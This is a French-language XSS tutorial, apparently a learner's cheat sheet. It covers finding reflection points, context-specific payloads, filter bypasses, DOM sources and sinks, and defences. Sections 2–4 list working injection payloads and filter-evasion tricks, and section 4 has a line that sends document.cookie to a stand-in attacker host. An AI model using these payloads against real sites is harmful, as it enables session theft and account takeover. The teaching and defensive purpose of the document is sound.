# Cross-site scripting (XSS)

Le XSS, c'est faire exécuter ton propre JavaScript dans le navigateur d'un autre
utilisateur, dans le contexte du site cible. De là tu peux lire la page, voler
du matériel de session, agir à la place de la victime, ou pivoter. Trois
variantes : **réfléchi** (payload renvoyé dans la réponse), **stocké** (payload
enregistré côté serveur et servi aux autres), et **DOM** (du JS côté client
écrit ton entrée dans la page).

Tous les exemples sont génériques. Rien ici n'est la solution d'un challenge précis.

## 1. Trouver une réflexion

Envoie un marqueur unique (`white7391`) dans chaque paramètre, en-tête et
segment d'URL, puis cherche-le dans la réponse. L'endroit où il atterrit indique
le contexte et ce dont tu dois sortir :

- **Corps HTML** — `<h1>white7391</h1>`
- **Attribut** — `<input value="white7391">`
- **Chaîne JS** — `var x = "white7391";`
- **URL** — `<a href="white7391">`

## 2. Le contexte décide du payload

Adapte la sortie à l'endroit où tu as atterri :

**Corps HTML** — injecte une balise directement :

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Dans un attribut** — ferme-le d'abord :

```
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
```

**Dans une chaîne JS** — ferme la chaîne/l'instruction :

```
";alert(1)//
</script><script>alert(1)</script>
```

**Dans un href** — change de schéma :

```
javascript:alert(1)
```

## 3. Contourner les filtres

Quand des filtres naïfs retirent `<script>` ou `alert` :

- **Autres balises/handlers** — `<img onerror>`, `<svg onload>`,
  `<body onload>`, `<details open ontoggle=alert(1)>`.
- **Casse / imbrication** — `<ScRiPt>`, `<scr<script>ipt>` (le filtre retire
  l'intérieur et recolle l'extérieur).
- **Sans parenthèses** — `onerror=alert\`1\`` (template literal), ou
  `location=name`.
- **Encodage** — entités HTML dans les attributs (`&#x61;lert`), ou
  `eval(atob('...'))` pour cacher la chaîne.

## 4. En faire un impact

Un popup prouve l'exécution ; montre un vrai impact avec un payload qui fait
quelque chose :

```html
<img src=x onerror="new Image().src='//TON-HOTE/c?'+document.cookie">
```

Si le cookie est `HttpOnly`, tu ne peux pas le lire — pivote : fais des requêtes
authentifiées avec `fetch()` (même origine, les cookies partent avec), récupère
des tokens CSRF, soumets des formulaires, ou hook le navigateur.

## 5. XSS côté DOM

Pas besoin de réflexion serveur. Le code vulnérable est côté client : une
**source** que tu contrôles arrive dans un **sink** dangereux.

Sources : `location`, `location.hash`, `document.referrer`, `postMessage`.
Sinks : `innerHTML`, `outerHTML`, `document.write`, `eval`,
`setTimeout(str)`, `element.src`.

Cherche dans le JS un sink qui lit une source, par ex. :

```js
div.innerHTML = location.hash.slice(1);   // #<img src=x onerror=alert(1)>
```

Le payload ne touche jamais le serveur — il vit dans le fragment d'URL que le
navigateur traite localement.

## 6. Se défendre

- **Encodage de sortie selon le contexte** — encode HTML en sortie HTML, encode
  JS dans les scripts, encode URL dans les URL. Un framework moderne (React,
  Vue, Angular) fait l'essentiel automatiquement ; ne le contourne pas avec
  `dangerouslySetInnerHTML` / `v-html`.
- **Content-Security-Policy** — un `script-src` strict (nonces/hashes, sans
  `unsafe-inline`) transforme beaucoup d'injections en HTML mort.
- Cookies **HttpOnly** pour que le script ne lise pas la session ; **SameSite**
  pour limiter les requêtes cross-site.
- Pour les sinks DOM, utilise `textContent` plutôt que `innerHTML`, et nettoie
  avec une bibliothèque de confiance (DOMPurify) quand tu as vraiment besoin de
  HTML.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
